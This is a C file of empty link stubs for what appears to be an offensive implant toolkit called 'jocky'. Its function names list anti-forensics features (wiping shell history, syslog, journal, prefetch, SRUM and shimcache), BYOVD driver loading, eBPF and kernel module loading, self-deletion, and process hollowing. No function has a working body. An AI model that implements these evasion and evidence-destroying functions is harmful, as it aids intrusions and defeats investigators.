/* Link stubs for undefined references - placeholder implementations */

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Module operations */
int jocky_module_load(const char* path) { return -1; }
int jocky_module_unload(const char* name) { return -1; }
int jocky_lkm_load(const char* path) { return -1; }
int jocky_lkm_unload(const char* name) { return -1; }
int jocky_module_base(const char* name) { return -1; }

/* Process operations - implemented in process_hollow.c */

/* Forensics operations */
int jocky_wipe_prefetch(void) { return 0; }
int jocky_wipe_artifacts(void) { return 0; }
int jocky_clear_logs(void) { return 0; }
int jocky_cleanup_all(void) { return 0; }
int linux_forensics_wipe_bash_history(void) { return 0; }
int jocky_linux_cleanup_syslog(void) { return 0; }
int jocky_linux_cleanup_journal(void) { return 0; }

/* Windows forensics (no-ops on Linux) */
int forensics_wipe_cmd_history(void) { return 0; }
int forensics_wipe_powershell_history(void) { return 0; }
int forensics_clear_dns_cache(void) { return 0; }
int forensics_flush_arp_cache(void) { return 0; }

/* BYOVD/driver */
int byovd_load_driver(const char* path) { return -1; }

/* eBPF operations */
int jocky_ebpf_load(const char* code) { return -1; }
int jocky_ebpf_attach(const char* func) { return -1; }
int jocky_ebpf_run(void) { return -1; }

/* Windows-specific (no-ops on Linux) */
int jocky_clear_srum(void) { return 0; }
int jocky_patch_amcache(void) { return 0; }
int jocky_patch_shimcache(void) { return 0; }
int jocky_self_delete(void) { return 0; }

/* Helper functions */
void jocky_sleep_and_recheck(void) { sleep(1); }

/* String operations */
const char* jocky_str_concat(const char* a, const char* b) {
    if (!a || !b) return "";
    static char buf[4096];
    snprintf(buf, sizeof(buf), "%s%s", a, b);
    return buf;
}
